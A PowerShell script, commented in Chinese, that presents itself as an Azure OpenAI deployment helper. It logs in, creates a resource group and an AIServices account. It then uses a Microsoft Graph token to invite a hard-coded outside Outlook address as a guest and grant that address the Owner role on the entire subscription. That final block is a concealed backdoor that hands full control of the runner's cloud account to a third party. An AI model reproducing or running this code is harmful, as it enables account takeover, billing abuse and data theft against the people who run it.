# 遇到错误时停止执行
$ErrorActionPreference = "Stop"

# 固定邮箱
$email = "dtfxeirynxatqx@outlook.com"

# 可用的 OpenAI 地区
$locations = @(
    "eastus"
)

# 美化输出的函数
function Write-ColorOutput {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message,
        [string]$ForegroundColor = "White",
        [switch]$NoNewline
    )
    
    $originalColor = $host.UI.RawUI.ForegroundColor
    $host.UI.RawUI.ForegroundColor = $ForegroundColor
    
    if ($NoNewline) {
        Write-Host $Message -NoNewline
    } else {
        Write-Host $Message
    }
    
    $host.UI.RawUI.ForegroundColor = $originalColor
}

function Write-Section {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Title
    )
    
    Write-Host ""
    Write-ColorOutput ("=" * 60) "DarkCyan"
    Write-ColorOutput $Title "Cyan"
    Write-ColorOutput ("=" * 60) "DarkCyan"
}

function Write-Step {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message
    )
    
    Write-Host ""
    Write-ColorOutput "✨ $Message" "Yellow"
}

function Write-Success {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message
    )
    
    Write-ColorOutput "✅ $Message" "Green"
}

function Write-Error {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message
    )
    
    Write-ColorOutput "❌ $Message" "Red"
}

function Write-Info {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message
    )
    
    Write-ColorOutput "ℹ️ $Message" "Gray"
}

# 在脚本开始时先进行 Azure 登录
Write-Section "Azure 账号登录"
try {
    Write-Step "正在登录 Azure..."
    az login
    Write-Success "Azure 登录成功"
} catch {
    Write-Error "Azure 登录失败: $($_.Exception.Message)"
    exit
}

# 标记是否有任何操作成功
$isSuccess = $false

# 获取订阅 ID
try {
    Write-Step "正在获取订阅信息..."
    $subscriptionId = az account show --query id -o tsv
    if (-not $subscriptionId) {
        throw "未能获取订阅ID"
    }
    Write-Success "获取订阅信息成功"
    Write-Info "订阅 ID: $subscriptionId"
} catch {
    Write-Error "获取订阅ID失败: $($_.Exception.Message)"
    exit
}

# 获取 Tenant 信息
try {
    $homeTenantId = az account show --query homeTenantId -o tsv
    if ($homeTenantId) {
        Write-Info "父管理组(租户) ID: $homeTenantId"
    }
} catch {
    Write-Error "获取 Tenant ID 失败: $($_.Exception.Message)"
}

Write-Section "Azure 资源部署"

# 创建随机名称和选择随机地区
$randomName = -join ((97..122) + (48..57) | Get-Random -Count 8 | ForEach-Object {[char]$_})
$randomLocation = $locations | Get-Random

Write-Step "开始创建 Azure 资源..."
Write-Info "随机生成的资源名称: $randomName"
Write-Info "随机选择的部署区域: $randomLocation"

# 创建资源组
try {
    Write-Step "正在创建资源组"
    Write-Info "资源组名称: $randomName"
    Write-Info "部署区域: $randomLocation"
    
    az group create --name "$randomName" --location $randomLocation | Out-Null
    Write-Success "资源组创建成功 ✨"
    
    # 创建 OpenAI 服务
    Write-Step "正在创建 OpenAI 服务"
    Write-Info "服务名称: $randomName"
    Write-Info "SKU: Standard S0"
    
    az cognitiveservices account create `
        --name "$randomName" `
        --resource-group "$randomName" `
        --location $randomLocation `
        --kind AIServices `
        --sku s0 `
        --custom-domain "$randomName" | Out-Null
        
    Write-Success "OpenAI 服务创建成功 🚀"
    
    Write-Section "资源部署完成"
    Write-Info "资源组名称: $randomName"
    Write-Info "OpenAI 服务名称: $randomName"
    Write-Info "部署区域: $randomLocation"
    Write-Success "所有资源部署成功完成"

} catch {
    Write-Section "部署失败"
    Write-Error "资源创建过程中发生错误"
    Write-Info "错误详情: $($_.Exception.Message)"
    Write-Info "继续执行后续操作..."
}

# 进行用户邀请
Write-Section "邀请用户"
try {
    Write-Step "正在邀请用户: $email"

    # 获取 Microsoft Graph 访问令牌
    $graphToken = az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv
    
    # 设置请求头
    $headers = @{
        "Authorization" = "Bearer $graphToken"
        "Content-Type"  = "application/json"
    }

    # 构建邀请请求
    $invitationBody = @{
        invitedUserEmailAddress = $email
        inviteRedirectUrl      = "https://portal.azure.com"
        sendInvitationMessage  = $true
        invitedUserType        = "Guest"
    } | ConvertTo-Json

    # 发送邀请
    $invitationResponse = Invoke-RestMethod -Method POST -Uri "https://graph.microsoft.com/v1.0/invitations" -Headers $headers -Body $invitationBody
    Write-Success "邀请已发送"

    # 获取用户 ObjectId
    $userId = $invitationResponse.invitedUser.id
    if (-not $userId) {
        Write-Info "等待用户信息同步..."
        Start-Sleep -Seconds 10  # 等待用户创建完成
        $userId = az ad user show --id $email --query id -o tsv
        if (-not $userId) {
            throw "无法获取用户 $email 的信息。"
        }
    }

    # 分配 Owner 角色
    az role assignment create --role "Owner" --assignee-object-id $userId --scope "/subscriptions/$subscriptionId"
    Write-Success "已成功分配 Owner 角色"

    Write-Section "邀请用户成功"
    Write-Success "已成功邀请用户并分配权限"
    Write-Info "订阅 ID: $subscriptionId"
    Write-Info "租户 ID: $homeTenantId"
    Write-Info "访问链接: https://portal.azure.com/$homeTenantId"
    
    $isSuccess = $true
}
catch {
    Write-Error "邀请用户失败: $($_.Exception.Message)"
}

# 如果操作失败，最终提示
if (-not $isSuccess) {
    Write-Section "操作失败"
    Write-Error "所有操作均未成功，请尝试手动部署"
    Write-Info "订阅 ID: $subscriptionId"
}
